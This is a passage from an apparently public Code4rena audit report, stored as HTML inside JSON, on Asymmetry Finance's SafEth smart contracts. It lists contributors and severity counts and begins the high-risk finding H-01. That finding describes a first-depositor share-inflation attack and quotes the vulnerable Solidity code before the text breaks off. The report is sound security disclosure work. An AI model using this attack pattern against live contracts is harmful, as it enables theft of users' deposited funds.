{
  "circa": {
    "title": "Asymmetry contest",
    "sponsor": "Asymmetry Finance",
    "slug": "2023-03-asymmetry",
    "date": "2023-07-28",
    "findings": "https://github.com/code-423n4/2023-03-asymmetry-findings/issues",
    "contest": 226
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit outlined in this document, C4 conducted an analysis of the Asymmetry audit smart contract system written in Solidity. The audit took place between March 24—March 30 2023.</p>\n<p>Following the C4 audit, 3 wardens (<a href=\"https://twitter.com/IAm0x52\">0x52</a>, <a href=\"https://twitter.com/adrianromero\">adriro</a>, and d3e4) reviewed the mitigations for all identified issues; the <a href=\"#mitigation-review\">Mitigation Review</a> report is appended below the audit report.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>271 Wardens contributed reports to the Asymmetry audit:</p>\n<ol>\n<li>019EC6E2</li>\n<li><a href=\"https://twitter.com/0kage_eth\">0Kage</a></li>\n<li>0x3b</li>\n<li><a href=\"https://twitter.com/IAm0x52\">0x52</a></li>\n<li><a href=\"https://twitter.com/0xAgro\">0xAgro</a></li>\n<li>0xGordita</li>\n<li>0xGusMcCrae</li>\n<li>0xMirce</li>\n<li>0xNorman</li>\n<li><a href=\"https://twitter.com/0xRajkumar\">0xRajkumar</a></li>\n<li>0xRobocop</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xTraub</li>\n<li>0xWagmi</li>\n<li>0xWaitress</li>\n<li><a href=\"https://twitter.com/0xadrii\">0xadrii</a></li>\n<li>0xbepresent</li>\n<li>0xc0ffEE</li>\n<li><a href=\"https://twitter.com/0xd1r4cde17a\">0xd1r4cde17a</a></li>\n<li>0xepley</li>\n<li>0xffchain</li>\n<li><a href=\"https://twitter.com/sstrenev\">0xfusion</a></li>\n<li>0xhacksmithh</li>\n<li>0xkazim</li>\n<li>0xl51</li>\n<li>0xmuxyz</li>\n<li><a href=\"https://twitter.com/0xnevi\">0xnev</a></li>\n<li><a href=\"https://twitter.com/0xpanicError\">0xpanicError</a></li>\n<li>3dgeville</li>\n<li>4lulz</li>\n<li>7siech</li>\n<li><a href=\"https://twitter.com/akshaysrivastv\">AkshaySrivastav</a></li>\n<li><a href=\"https://twitter.com/AdityaK0010\">Angry_Mustache_Man</a></li>\n<li><a href=\"https://www.arbitraryexecution.com/\">ArbitraryExecution</a> (cr0, arbitrary-wanaks, tridearm, CodeBeholder, WGMIApe, pbwaffles and yowl)</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>BPZ (pa6221, Bitcoinfever244 and PrasadLak)</li>\n<li>BRONZEDISC</li>\n<li>Bahurum</li>\n<li>BanPaleo</li>\n<li>Bason</li>\n<li>Bauer</li>\n<li><a href=\"https://twitter.com/TheBlockChainer\">Bloqarl</a></li>\n<li><a href=\"https://twitter.com/BlueAlder\">BlueAlder</a></li>\n<li>Breeje</li>\n<li>Brenzee</li>\n<li><a href=\"https://twitter.com/CRYP70_\">CRYP70</a></li>\n<li><a href=\"https://twitter.com/Conan0x3\">Co0nan</a></li>\n<li><a href=\"https://twitter.com/CodeFoxInc\">CodeFoxInc</a> (<a href=\"https://twitter.com/Markwu_crypto\">thurendous</a>, TerrierLover and retocrooman)</li>\n<li>CodingNameKiki</li>\n<li><a href=\"https://twitter.com/DeFiCast\">Cryptor</a></li>\n<li><a href=\"https://twitter.com/DadeKuma\">DadeKuma</a></li>\n<li>DeStinE21</li>\n<li><a href=\"https://twitter.com/DevABDee\">DevABDee</a></li>\n<li>Diana</li>\n<li>Dug</li>\n<li><a href=\"https://twitter.com/emeduduna\">Emmanuel</a></li>\n<li>Englave</li>\n<li>EvanW</li>\n<li>Evo</li>\n<li><a href=\"https://franfran.dev/\">Franfran</a></li>\n<li>Gde</li>\n<li><a href=\"https://twitter.com/HHK_eth\">HHK</a></li>\n<li>Haipls</li>\n<li>HollaDieWaldfee</li>\n<li><a href=\"https://twitter.com/IgniteLikeAFire\">Ignite</a></li>\n<li>IgorZuk</li>\n<li>Infect3d</li>\n<li>J4de</li>\n<li><a href=\"https://twitter.com/0xJCN\">JCN</a></li>\n<li>Jerry0x</li>\n<li>Josiah</li>\n<li><a href=\"https://www.linkedin.com/in/kayode-okunlade-862001142/\">Kaysoft</a></li>\n<li><a href=\"https://github.com/NikolaMadzharov\">Koko1912</a></li>\n<li><a href=\"https://twitter.com/KoolexC\">Koolex</a></li>\n<li>Krace</li>\n<li>KrisApostolov</li>\n<li>Lavishq</li>\n<li>LeoGold</li>\n<li>Lirios</li>\n<li><a href=\"https://twitter.com/wookiemad\">MadWookie</a></li>\n<li>Madalad</li>\n<li>Matin</li>\n<li>MiksuJak</li>\n<li><a href=\"https://milotruck.github.io/\">MiloTruck</a></li>\n<li>MiniGlome</li>\n<li>Moliholy</li>\n<li>NoamYakov</li>\n<li>P7N8ZK</li>\n<li><a href=\"https://twitter.com/Pronobis4\">PNS</a></li>\n<li>Parad0x</li>\n<li>Phantasmagoria</li>\n<li>Polaris_tow</li>\n<li><a href=\"https://twitter.com/rappenstein2\">Rappie</a></li>\n<li>RaymondFam</li>\n<li>RedTiger</li>\n<li>ReyAdmirado</li>\n<li><a href=\"https://rickardlarsson22.github.io/\">Rickard</a></li>\n<li><a href=\"https://twitter.com/Rolezn\">Rolezn</a></li>\n<li><a href=\"https://twitter.com/0xruhum\">Ruhum</a></li>\n<li>SadBase</li>\n<li>SaeedAlipoor01988</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li><a href=\"https://twitter.com/theshogoki\">Shogoki</a></li>\n<li>Stiglitz</li>\n<li>SunSec</li>\n<li>T1MOH</li>\n<li><a href=\"https://twitter.com/ToonVH_\">ToonVH</a></li>\n<li><a href=\"https://twitter.com/0xToshii\">Toshii</a></li>\n<li>Tricko</li>\n<li>UdarTeam (ahmedov and tourist)</li>\n<li><a href=\"https://github.com/udsene\">Udsen</a></li>\n<li>UniversalCrypto (amaechieth and tettehnetworks)</li>\n<li><a href=\"https://twitter.com/VagnerAndrei98\">Vagner</a></li>\n<li>Viktor_Cortess</li>\n<li>Wander (xAlismx, ubl4nk and mahdikarimi)</li>\n<li>__141345__</li>\n<li>a3yip6</li>\n<li><a href=\"https://twitter.com/adeshkolte_\">ad3sh_</a></li>\n<li>adeolu</li>\n<li><a href=\"https://twitter.com/adrianromero\">adriro</a></li>\n<li>aga7hokakological</li>\n<li>ak1</li>\n<li><a href=\"https://twitter.com/alejandrocovrr\">alejandrocovrr</a></li>\n<li>alexzoid</li>\n<li>anodaram</li>\n<li>arialblack14</li>\n<li>ast3ros</li>\n<li><a href=\"https://twitter.com/auditor0517\">auditor0517</a></li>\n<li><a href=\"https://twitter.com/agfviggiano\">aviggiano</a></li>\n<li>ayden</li>\n<li>bart1e</li>\n<li>bearonbike</li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>brevis</li>\n<li>brgltd</li>\n<li>btk</li>\n<li><a href=\"https://twitter.com/bytes032\">bytes032</a></li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://twitter.com/carlitox477\">carlitox477</a></li>\n<li>carrotsmuggler</li>\n<li><a href=\"https://twitter.com/CatellaTech\">catellatech</a></li>\n<li>ch0bu</li>\n<li>chaduke</li>\n<li>chalex</li>\n<li>ck</li>\n<li>climber2002</li>\n<li>cloudjunky</li>\n<li><a href=\"https://twitter.com/codeIslight\">codeislight</a></li>\n<li>codeslide</li>\n<li>codetilda</li>\n<li>cryptonue</li>\n<li>cryptothemex</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>d3e4</li>\n<li><a href=\"https://twitter.com/deadrosesxyz\">deadrxsezzz</a></li>\n<li>dec3ntraliz3d</li>\n<li><a href=\"https://rafal-kalinowski.pl/\">deliriusz</a></li>\n<li>descharre</li>\n<li>dicethedev</li>\n<li><a href=\"https://twitter.com/dingo2077/\">dingo2077</a></li>\n<li>ernestognw</li>\n<li><a href=\"https://twitter.com/eyexploit\">eyexploit</a></li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li><a href=\"https://twitter.com/favelanky\">favelanky</a></li>\n<li>fs0c</li>\n<li>fyvgsk</li>\n<li><a href=\"https://twitter.com/georgits_\">georgits</a></li>\n<li><a href=\"https://twitter.com/giovannidisiena\">giovannidisiena</a></li>\n<li>gjaldon</li>\n<li><a href=\"https://twitter.com/chewonithard1\">handsomegiraffe</a></li>\n<li><a href=\"https://www.truscova.com/\">hassan-truscova</a></li>\n<li>helios</li>\n<li><a href=\"https://twitter.com/henryxf3\">hihen</a></li>\n<li><a href=\"https://github.com/hklst4r\">hklst4r</a></li>\n<li>hl_</li>\n<li><a href=\"https://twitter.com/hunt3r_w3b\">hunter_w3b</a></li>\n<li>idkwhatimdoing</li>\n<li>igingu</li>\n<li>inmarelibero</li>\n<li>jasonxiale</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li><a href=\"https://twitter.com/0xJuancito\">juancito</a></li>\n<li><a href=\"https://twitter.com/0xKaden\">kaden</a></li>\n<li>koxuan</li>\n<li><a href=\"https://twitter.com/ks__xxxxx\">ks__xxxxx</a></li>\n<li><a href=\"https://twitter.com/Xc1008Cui\">ladboy233</a></li>\n<li>latt1ce</li>\n<li>lopotras</li>\n<li>lukris02</li>\n<li><a href=\"https://t.me/Road220\">m_Rassska</a></li>\n<li><a href=\"http://www.linkedin.com/in/mahdirostami\">mahdirostami</a></li>\n<li><a href=\"https://github.com/maxper4\">maxper</a></li>\n<li>mert_eren</li>\n<li>mojito_auditor</li>\n<li><a href=\"https:/twitter.com/0xmonrel\">monrel</a></li>\n<li><a href=\"https://twitter.com/n1punp\">n1punp</a></li>\n<li>n33k</li>\n<li><a href=\"https://twitter.com/nadin20678790\">nadin</a></li>\n<li><a href=\"https://twitter.com/zeroxnavinavu\">navinavu</a></li>\n<li><a href=\"https://twitter.com/nem_veer\">nemveer</a></li>\n<li><a href=\"https://twitter.com/neumoXX\">neumo</a></li>\n<li><a href=\"https://twitter.com/SimpleMachine92\">nowonder92</a></li>\n<li>p_crypt0</li>\n<li>parsely</li>\n<li><a href=\"https://twitter.com/@PavanKumarKv2\">pavankv</a></li>\n<li>peanuts</li>\n<li><a href=\"https://t.me/pfahard\">pfapostol</a></li>\n<li>pipoca</li>\n<li>pixpi</li>\n<li>pontifex</li>\n<li>qpzm</li>\n<li>rbserver</li>\n<li>reassor</li>\n<li>roelio</li>\n<li>rotcivegaf</li>\n<li>rvierdiiev</li>\n<li>said</li>\n<li>sashik_eth</li>\n<li>scokaf (Scoon and jauvany)</li>\n<li><a href=\"https://twitter.com/shaka0x\">shaka</a></li>\n<li>shalaamum</li>\n<li><a href=\"https://github.com/shuklaayush\">shuklaayush</a></li>\n<li>siddhpurakaran</li>\n<li>silviaxyz</li>\n<li><a href=\"twitter.com/noots0\">sinarette</a></li>\n<li>skidog</li>\n<li>slippopz</li>\n<li><a href=\"https://twitter.com/slvDev\">slvDev</a></li>\n<li>smaul</li>\n<li>tank</li>\n<li><a href=\"https://twitter.com/0xteddav\">teddav</a></li>\n<li>tnevler</li>\n<li>top1st</li>\n<li><a href=\"https://twitter.com/totomanov\">totomanov</a></li>\n<li><a href=\"https://twitter.com/cvetanovv0\">tsvetanovv</a></li>\n<li><a href=\"https://www.linkedin.com/in/victor-okafor-blockchaindev/\">turvy_fuzz</a></li>\n<li>ulqiorra</li>\n<li>vagrant</li>\n<li><a href=\"https://twitter.com/0xVolodya\">volodya</a></li>\n<li>wait</li>\n<li><a href=\"https://twitter.com/0xtarafans\">wen</a></li>\n<li><a href=\"https://twitter.com/whoismatthewmc1\">whoismatthewmc1</a></li>\n<li>y1cunhui</li>\n<li>yac (t4k, <a href=\"https://twitter.com/XianganH\">Peep</a>, <a href=\"https://twitter.com/thebensams\">thebensams</a>, <a href=\"https://twitter.com/devtooligan\">devtooligan</a>,  <a href=\"https://twitter.com/blockdeveth\">blockdev</a>, <a href=\"https://twitter.com/usmannk\">usmannk</a>, jkelleyjr, <a href=\"https://github.com/thraull\">thraull</a>, NibblerExpress, <a href=\"https://twitter.com/bl4ckb1rd71\">engn33r</a>, <a href=\"https://twitter.com/prady_v\">prady</a> and panda)</li>\n<li>yudan</li>\n<li>zzzitron</li>\n</ol>\n<p>This audit was judged by <a href=\"https://twitter.com/thePicodes\">Picodes</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/yadir_lakehal\">yadir</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 20 unique vulnerabilities. Of these vulnerabilities, 8 received a risk rating in the category of HIGH severity and 12 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 143 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 55 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-03-asymmetry\">C4 Asymmetry audit repository</a>, and is composed of 4 smart contracts written in the Solidity programming language and includes 460 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-8\" style=\"position:relative;\"><a href=\"#high-risk-findings-8\" aria-label=\"high risk findings 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (8)</h1>\n<h2 id=\"h-01-an-attacker-can-manipulate-the-predepositveprice-to-steal-from-other-users\" style=\"position:relative;\"><a href=\"#h-01-an-attacker-can-manipulate-the-predepositveprice-to-steal-from-other-users\" aria-label=\"h 01 an attacker can manipulate the predepositveprice to steal from other users permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1098\">[H-01] An attacker can manipulate the preDepositvePrice to steal from other users</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1098\">monrel</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1092\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1091\">d3e4</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1074\">anodaram</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1063\">ulqiorra</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1053\">parsely</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1022\">n33k</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/912\">Tricko</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/862\">Haipls</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/856\">sinarette</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/855\">nemveer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/815\">0xRajkumar</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/813\">mahdirostami</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/795\">0xfusion</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/784\">sashik_eth</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/758\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/742\">Vagner</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/739\">RedTiger</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/720\">aga7hokakological</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/715\">bytes032</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/705\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/678\">pavankv</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/677\">yac</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/600\">sinarette</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/535\">Bahurum</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/528\">ToonVH</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/523\">shaka</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/491\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/461\">bart1e</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/454\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/447\">mert_eren</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/315\">Krace</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/312\">ck</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/269\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/212\">igingu</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/205\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/170\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/144\">Cryptor</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/129\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/116\">Dug</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/55\">Brenzee</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>The first user that stakes can manipulate the total supply of sfTokens and by doing so create a rounding error for each subsequent user. In the worst case, an attacker can steal all the funds of the next user.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When the first user enters totalSupply is set to 1e18 on <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L79\">L79</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// initializes with a price of 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>But the user can immediately unstake most of his safETH such that totalSupply &#x3C;&#x3C;  1e18. The attacker can then transfer increase the underlying amount by transferring derivative tokens to the derivative contracts.</p>\n<p>For subsequent users, the preDepositPrice will be heavily inflated and the calculation of mintAmount on <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98\">L98</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" 